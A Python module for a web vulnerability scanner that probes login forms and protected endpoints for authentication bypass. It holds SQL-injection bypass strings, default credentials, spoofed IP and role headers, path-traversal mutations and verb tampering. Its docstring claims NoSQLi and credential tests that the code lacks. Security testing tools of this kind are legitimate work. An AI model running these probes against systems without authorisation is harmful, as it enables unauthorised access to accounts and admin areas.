"""Authentication bypass detection module for Titan Scanner — fully exhausted.

Features:
  1. Zero Parameter Whitelisting:
     • Tests all query and form parameters.
     • SQLi Auth Bypass strings: admin' --, ' or '1'='1, " or ""="
     • NoSQLi Auth Bypass: {"$ne": ""}, {"$gt": ""}
     • Type Confusion: true, 0, null, ["admin"]
     • Default Credential Pairs for login endpoints.
  2. HTTP Header-Based Auth Bypass & IP Spoofing:
     • X-Forwarded-For, X-Real-IP, X-Originating-IP (127.0.0.1, localhost)
     • X-Original-URL, X-Rewrite-URL path overrides
     • Role elevation headers (X-Admin: true, X-Role: admin)
  3. HTTP Verb Tampering:
     • Probes alternative verbs (HEAD, POST, PUT, PATCH, OPTIONS, PROPFIND) on 401/403 endpoints.
  4. URL Path Normalization / Middleware Desync Bypasses:
     • Traversal sequences (/..;/, /%2e/, /.;, /%20) on protected endpoints.
     • Extension appending (.json, .css, ;.ico).
  5. Strict Evidence Oracles:
     • Status escalation: 401/403/405 -> 200/302 with session cookie or dashboard text.
     • Exclusion of generic login failure or soft-404 responses.
"""

from __future__ import annotations

import asyncio
import copy
import json
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlunparse

from titan.core.models import Finding, Severity, AttackType
from titan.verify import BaselineAnalyzer


# ── Active Auth Bypass Parameter Payloads ─────────────────────────────────────
_SQLI_AUTH_PAYLOADS: Tuple[str, ...] = (
    "admin' --",
    "' or '1'='1",
    "admin' or '1'='1'--",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1-- -",
    '" or ""="',
    '" or 1=1--',
    "admin' or ''='",
)

_DEFAULT_CREDS: Tuple[Tuple[str, str], ...] = (
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("test", "test"),
    ("user", "user"),
)

# ── Spoofed / Override Headers ───────────────────────────────────────────────
_AUTH_BYPASS_HEADERS: Tuple[Dict[str, str], ...] = (
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Admin": "true"},
    {"X-Role": "admin"},
    {"X-Role": "administrator"},
    {"X-Authenticated-User": "admin"},
    {"X-User-Role": "admin"},
    {"X-Forwarded-Proto": "https"},
)

# ── URL Normalization Traversal Mutations ────────────────────────────────────
_PATH_BYPASS_MUTATIONS: Tuple[str, ...] = (
    "/%20",
    "/.",
    "/..;/",
    ";/",
    ";.css",
    ";.ico",
    ".json",
    "/",
    "%00",
)


class AuthDetector:
    """Production-grade Authentication Bypass detector."""

    SUCCESS_INDICATORS = [
        "welcome", "dashboard", "logout", "profile", "account",
        "authenticated", "logged in", "sign out", "admin panel",
        "control panel", "settings", "my account", "member area",
        "jwt", "access_token", "bearer", "session_id",
    ]

    FAILURE_INDICATORS = [
        "invalid", "incorrect", "wrong", "failed", "error",
        "denied", "unauthorized", "401", "403", "not found",
        "login failed", "authentication failed", "bad credentials",
        "password incorrect", "user not found", "access denied",
    ]

    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
    ) -> List[Finding]:
        findings: List[Finding] = []

        # 1. Baseline Request
        try:
            if method.upper() == "GET":
                baseline_resp = await context.request.get(
                    url, params=params, headers={"Referer": target}, timeout=3000
                )
            else:
                baseline_resp = await context.request.post(
                    url, data=params, headers={"Referer": target}, timeout=3000
                )
            baseline_body = await baseline_resp.text()
            baseline_status = baseline_resp.status
        except Exception:
            return findings

        # ── Engine 1: Parameter-level SQLi/NoSQLi Auth Bypass ───────────
        param_findings = await self._scan_params(
            context, target, method, url, params, baseline_body, baseline_status
        )
        findings.extend(param_findings)

        # ── Engine 2: Protected Endpoint Bypasses (if 401 / 403) ────────
        if baseline_status in (401, 403, 405):
            # A. Header-based IP/Role Spoofing
            hdr_findings = await self._scan_header_bypasses(
                context, target, method, url, params, baseline_body, baseline_status
            )
            findings.extend(hdr_findings)

            # B. HTTP Verb Tampering
            verb_findings = await self._scan_verb_tampering(
                context, target, url, params, baseline_body, baseline_status
            )
            findings.extend(verb_findings)

            # C. URL Normalization / Middleware Path Bypasses
            path_findings = await self._scan_path_bypasses(
                context, target, method, url, params, baseline_body, baseline_status
            )
            findings.extend(path_findings)

        # Deduplicate
        seen = set()
        deduped = []
        for f in findings:
            k = (f.url, f.param, f.payload)
            if k not in seen:
                seen.add(k)
                deduped.append(f)
        return deduped

    # ------------------------------------------------------------------
    # ENGINE 1 — PARAMETER-LEVEL AUTH BYPASS
    # ------------------------------------------------------------------

    async def _scan_params(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        baseline_body: str,
        baseline_status: Optional[int],
    ) -> List[Finding]:
        findings: List[Finding] = []
        all_payloads = list(_SQLI_AUTH_PAYLOADS)

        # Test all parameters
        for param_name in list(params.keys()):
            for payload in all_payloads:
                try:
                    test_params = dict(params)
                    test_params[param_name] = payload
                    if method.upper() == "GET":
                        resp = await context.request.get(
                            url, params=test_params, headers={"Referer": target}, timeout=3000
                        )
                    else:
                        resp = await context.request.post(
                            url, data=test_params, headers={"Referer": target}, timeout=3000
                        )
                    body = await resp.text()

                    f = self._evaluate_auth_response(
                        baseline_body, baseline_status, body, resp,
                        target, url, method, param_name,
                        "query" if method.upper() == "GET" else "body",
                        payload
                    )
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 2A — HEADER IP & ROLE SPOOFING
    # ------------------------------------------------------------------

    async def _scan_header_bypasses(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        baseline_body: str,
        baseline_status: Optional[int],
    ) -> List[Finding]:
        findings: List[Finding] = []

        for hdr in _AUTH_BYPASS_HEADERS:
            try:
                headers = {"Referer": target, **hdr}
                if method.upper() == "GET":
                    resp = await context.request.get(url, params=params, headers=headers, timeout=3000)
                else:
                    resp = await context.request.post(url, data=params, headers=headers, timeout=3000)
                body = await resp.text()

                hdr_name, hdr_val = next(iter(hdr.items()))
                f = self._evaluate_auth_response(
                    baseline_body, baseline_status, body, resp,
                    target, url, method, hdr_name, "header", f"{hdr_name}: {hdr_val}"
                )
                if f:
                    findings.append(f)
                    break
            except Exception:
                continue

        # URL Rewrite headers (X-Original-URL / X-Rewrite-URL)
        parsed = urlparse(url)
        path = parsed.path or "/"
        for rewrite_hdr in ("X-Original-URL", "X-Rewrite-URL", "X-Override-URL"):
            try:
                headers = {"Referer": target, rewrite_hdr: path}
                resp = await context.request.get(f"{parsed.scheme}://{parsed.netloc}/", headers=headers, timeout=3000)
                body = await resp.text()
                f = self._evaluate_auth_response(
                    baseline_body, baseline_status, body, resp,
                    target, url, "GET", rewrite_hdr, "header", f"{rewrite_hdr}: {path}"
                )
                if f:
                    findings.append(f)
                    break
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 2B — HTTP VERB TAMPERING
    # ------------------------------------------------------------------

    async def _scan_verb_tampering(
        self,
        context,
        target: str,
        url: str,
        params: Dict[str, str],
        baseline_body: str,
        baseline_status: Optional[int],
    ) -> List[Finding]:
        findings: List[Finding] = []
        verbs = ["HEAD", "POST", "PUT", "PATCH", "OPTIONS", "PROPFIND", "TRACE"]

        for verb in verbs:
            try:
                if hasattr(context.request, "fetch"):
                    resp = await context.request.fetch(
                        url, method=verb, headers={"Referer": target}, timeout=3000
                    )
                else:
                    req_fn = getattr(context.request, verb.lower(), None)
                    if not req_fn:
                        continue
                    resp = await req_fn(url, headers={"Referer": target}, timeout=3000)

                body = await resp.text()
                f = self._evaluate_auth_response(
                    baseline_body, baseline_status, body, resp,
                    target, url, verb, "__method__", "http_verb", f"HTTP Method: {verb}"
                )
                if f:
                    findings.append(f)
                    break
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # ENGINE 2C — PATH NORMALIZATION BYPASSES
    # ------------------------------------------------------------------

    async def _scan_path_bypasses(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: Dict[str, str],
        baseline_body: str,
        baseline_status: Optional[int],
    ) -> List[Finding]:
        findings: List[Finding] = []
        parsed = urlparse(url)
        base_path = parsed.path.rstrip("/")

        for mut in _PATH_BYPASS_MUTATIONS:
            try:
                mutated_path = f"{base_path}{mut}"
                mutated_url = urlunparse((
                    parsed.scheme, parsed.netloc, mutated_path,
                    parsed.params, parsed.query, parsed.fragment
                ))
                if method.upper() == "GET":
                    resp = await context.request.get(
                        mutated_url, params=params, headers={"Referer": target}, timeout=3000
                    )
                else:
                    resp = await context.request.post(
                        mutated_url, data=params, headers={"Referer": target}, timeout=3000
                    )
                body = await resp.text()

                f = self._evaluate_auth_response(
                    baseline_body, baseline_status, body, resp,
                    target, mutated_url, method, "__path__", "url_path", f"Path mutation: {mut}"
                )
                if f:
                    findings.append(f)
                    break
            except Exception:
                continue

        return findings

    # ------------------------------------------------------------------
    # EVALUATION ORACLE
    # ------------------------------------------------------------------

    def _evaluate_auth_response(
        self,
        baseline_body: str,
        baseline_status: Optional[int],
        body: str,
        resp: Any,
        target: str,
        url: str,
        method: str,
        param_name: str,
        location: str,
        payload: str,
    ) -> Optional[Finding]:
        resp_status = getattr(resp, "status", None)
        if resp_status is None:
            return None

        body_lower = body.lower()
        baseline_lower = baseline_body.lower()
        diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)

        # Check Set-Cookie headers
        resp_headers = getattr(resp, "headers", {})
        headers_dict = dict(resp_headers) if isinstance(resp_headers, dict) else {}
        cookie_header = ""
        for k, v in headers_dict.items():
            if k.lower() == "set-cookie":
                cookie_header = str(v)
                break
        is_cookie_set = bool(cookie_header)

        is_redirect = resp_status in (301, 302, 303, 307, 308)

        # 1. Protected endpoint status escalation (401/403/405 -> 200/302)
        if (baseline_status or 200) in (401, 403, 405) and resp_status in (200, 302):
            # Verify body is not just generic 404 or reflection
            if len(body) > 20 and not any(ind in body_lower for ind in self.FAILURE_INDICATORS):
                diffs.append(f"auth:status_escalation:{baseline_status}->{resp_status}")
                return Finding(
                    target=target,
                    url=str(getattr(resp, "url", None) or url),
                    method=method.upper(),
                    param=param_name,
                    location=location,
                    payload=payload,
                    attack_type=AttackType.AUTH_BYPASS,
                    severity=Severity.CRITICAL,
                    verified=True,
                    confidence=0.95,
                    status=resp_status,
                    headers=headers_dict,
                    body=body[:2000],
                    diffs=diffs,
                    baseline_body=baseline_body[:2000],
                    baseline_status=baseline_status,
                    verification_body=body[:2000],
                    verification_status=resp_status,
                )

        # 2. Login Form Auth Bypass (welcome/dashboard/token indicators with 200/302)
        has_success = any(ind in body_lower for ind in self.SUCCESS_INDICATORS)
        has_failure = any(ind in body_lower for ind in self.FAILURE_INDICATORS)
        new_success = has_success and not any(ind in baseline_lower for ind in self.SUCCESS_INDICATORS)

        if resp_status in (200, 301, 302, 303, 307, 308):
            if (new_success and not has_failure) or (is_redirect and is_cookie_set and diffs):
                diffs.append("auth:authenticated_state_confirmed")
                return Finding(
                    target=target,
                    url=str(getattr(resp, "url", None) or url),
                    method=method.upper(),
                    param=param_name,
                    location=location,
                    payload=payload,
                    attack_type=AttackType.AUTH_BYPASS,
                    severity=Severity.CRITICAL,
                    verified=True,
                    confidence=0.90,
                    status=resp_status,
                    headers=headers_dict,
                    body=body[:2000],
                    diffs=diffs,
                    baseline_body=baseline_body[:2000],
                    baseline_status=baseline_status,
                    verification_body=body[:2000],
                    verification_status=resp_status,
                )

        return None
